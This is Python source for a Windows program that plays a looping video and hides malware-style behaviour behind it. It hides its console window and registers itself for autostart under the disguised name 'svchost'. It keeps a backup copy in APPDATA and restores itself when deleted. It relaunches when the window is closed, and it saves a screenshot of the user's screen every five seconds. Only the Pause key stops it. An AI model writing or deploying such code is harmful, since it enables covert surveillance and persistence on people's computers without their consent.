import os
import shutil
import threading
import time
import keyboard
import sys
import winreg
import ctypes
import subprocess
import cv2
from PIL import Image, ImageTk, ImageGrab
import tkinter as tk

VIDEO_PATH = "video.mp4"
EXE_PATH = os.path.abspath(sys.argv[0])
BACKUP_PATH = os.path.expandvars(r"%APPDATA%\\backup.exe")
SCREENSHOT_PATH = os.path.expandvars(r"%APPDATA%\\screenshots")
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "svchost" 

def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)  

def add_autostart():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, EXE_PATH)
        winreg.CloseKey(key)
    except Exception:
        pass

def remove_autostart():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_NAME)
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception:
        pass

def monitor_file():
    while True:
        if not os.path.exists(EXE_PATH):
            try:
                shutil.copy(BACKUP_PATH, EXE_PATH)
            except Exception:
                pass
        time.sleep(2)

def get_video_path():
    if os.path.exists(VIDEO_PATH):
        return VIDEO_PATH
    if hasattr(sys, '_MEIPASS'):
        embedded_path = os.path.join(sys._MEIPASS, 'video.mp4')
        if os.path.exists(embedded_path):
            return embedded_path
    return None

class VideoPlayer(tk.Tk):
    def __init__(self, video_path):
        super().__init__()
        self.title("System Service")
        self.geometry("640x480")
        self.protocol("WM_DELETE_WINDOW", self.disable_event)

        self.label = tk.Label(self)
        self.label.pack()

        self.cap = cv2.VideoCapture(video_path)
        self.after(0, self.play_frame)

    def play_frame(self):
        ret, frame = self.cap.read()
        if not ret:
            self.cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            ret, frame = self.cap.read()
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(frame)
        imgtk = ImageTk.PhotoImage(image=img)
        self.label.imgtk = imgtk
        self.label.configure(image=imgtk)
        self.after(30, self.play_frame)

    def disable_event(self):
        try:
            subprocess.Popen([EXE_PATH], creationflags=subprocess.CREATE_NEW_CONSOLE)
        except Exception:
            pass

def keyboard_listener():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == 'pause':
                remove_autostart()
                os._exit(0)

def screenshot_logger():
    os.makedirs(SCREENSHOT_PATH, exist_ok=True)
    while True:
        try:
            img = ImageGrab.grab()
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            img.save(os.path.join(SCREENSHOT_PATH, f"{timestamp}.png"))
        except Exception:
            pass
        time.sleep(5)

def main():
    hide_console()

    if not os.path.exists(BACKUP_PATH):
        try:
            shutil.copy(EXE_PATH, BACKUP_PATH)
        except Exception:
            pass

    add_autostart()

    threading.Thread(target=monitor_file, daemon=True).start()
    threading.Thread(target=keyboard_listener, daemon=True).start()
    threading.Thread(target=screenshot_logger, daemon=True).start()

    video_path = get_video_path()
    if not video_path:
        print("Video file not found!")
        sys.exit(1)

    app = VideoPlayer(video_path)
    app.mainloop()

if __name__ == "__main__":
    main()
